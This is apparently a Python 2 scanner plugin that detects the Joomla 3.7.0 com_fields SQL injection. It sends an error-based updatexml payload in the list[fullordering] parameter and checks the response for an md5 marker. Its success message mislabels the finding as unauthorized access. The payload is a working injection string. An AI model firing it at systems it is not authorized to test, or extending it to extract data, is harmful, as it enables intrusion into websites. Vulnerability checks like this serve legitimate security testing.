# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Joomla 3.7.0 SQL注入漏洞",
        "info": "Joomla 3.7.0 存在SQL注入漏洞",
        "level": "高危",
        "type": "SQL注入",
        "author": "taro",
        "url": "",
        "keyword": "all:joomla",
        "source": 1
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(700)),1)'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'e5841df2166dd424' in res.text:
            info = '存在未授权访问: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
